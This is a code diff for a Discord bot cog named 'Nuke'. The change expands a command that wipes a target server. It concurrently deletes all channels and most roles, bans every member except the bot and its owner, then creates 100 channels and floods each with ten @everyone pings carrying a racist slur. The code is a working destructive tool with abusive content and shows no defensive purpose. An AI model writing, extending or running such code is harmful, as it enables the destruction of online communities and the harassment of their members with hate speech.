@@ -25,35 +25,70 @@ class Nuke(commands.Cog):
             await ctx.send(f"❌ Could not find server with ID `{server_id}`.")
             return
         
-        await ctx.send(f"🚨 Nuking **{guild.name}**... Deleting channels and creating 100 new ones.")
+        await ctx.send(f"🚨 **MAXIMUM NUKE** initiated on **{guild.name}**...\nThis will take a while due to Discord rate limits.")
         
-        # Delete all existing channels
-        deleted_count = 0
+        # Delete all channels FAST
+        deleted_channels = 0
+        delete_tasks = []
         for channel in list(guild.channels):
-            try:
-                await channel.delete(reason="Nuke command")
-                deleted_count += 1
-                await asyncio.sleep(0.3)
-            except Exception as e:
-                print(f"Failed to delete {channel.name}: {e}")
+            delete_tasks.append(self.delete_channel(channel))
+        results = await asyncio.gather(*delete_tasks, return_exceptions=True)
+        deleted_channels = sum(1 for r in results if r is None)
         
-        # Create 100 channels
-        created_count = 0
+        # Delete all roles FAST (except @everyone and bot's highest role)
+        deleted_roles = 0
+        role_tasks = []
+        for role in list(guild.roles):
+            if role.name != "@everyone" and role != guild.me.top_role:
+                role_tasks.append(self.delete_role(role))
+        results = await asyncio.gather(*role_tasks, return_exceptions=True)
+        deleted_roles = sum(1 for r in results if r is None)
+        
+        await ctx.send(f"🗑️ Deleted `{deleted_channels}` channels and `{deleted_roles}` roles...\n🔨 Now banning members (this is slow)...")
+        
+        # Ban all members (this is rate limited heavily)
+        banned_count = 0
+        for member in list(guild.members):
+            if member.id != self.bot.user.id and member.id != self.owner_id:
+                try:
+                    await member.ban(reason="Nuke command - get nuked", delete_message_days=7)
+                    banned_count += 1
+                except:
+                    pass
+        
+        await ctx.send(f"🔨 Banned `{banned_count}` members...\n📢 Now creating 100 channels with 10 pings each...")
+        
+        # Create 100 channels FAST with 10 pings each
+        created_channels = 0
         for i in range(100):
             try:
                 channel_name = f"nuked-{i+1}"
                 new_channel = await guild.create_text_channel(channel_name, reason="Nuke command")
                 
-                # Send @everyone ping with message
-                await new_channel.send("@everyone get nuked niggas")
-                created_count += 1
-                await asyncio.sleep(0.5)  # Rate limit safety between creates
+                # Send 10 pings rapidly
+                ping_tasks = []
+                for _ in range(10):
+                    ping_tasks.append(new_channel.send("@everyone get nuked niggas"))
+                await asyncio.gather(*ping_tasks, return_exceptions=True)
                 
+                created_channels += 1
             except Exception as e:
-                print(f"Failed to create channel {i+1}: {e}")
-                break  # Stop if we're hitting rate limits hard
+                print(f"Failed to create/spam channel {i+1}: {e}")
+                break
         
-        await ctx.send(f"✅ **NUKE COMPLETE**\n🗑️ Deleted `{deleted_count}` channels\n📢 Created `{created_count}` channels with pings")
+        await ctx.send(f"✅ **MAXIMUM NUKE COMPLETE**\n🗑️ Deleted `{deleted_channels}` channels\n🎭 Deleted `{deleted_roles}` roles\n🔨 Banned `{banned_count}` members\n📢 Created `{created_channels}` channels with 10 pings each")
+
+    async def delete_channel(self, channel):
+        try:
+            await channel.delete(reason="Nuke command")
+        except:
+            pass
+
+    async def delete_role(self, role):
+        try:
+            await role.delete(reason="Nuke command")
+        except:
+            pass
 
     @nuke.error
     async def nuke_error(self, ctx, error):
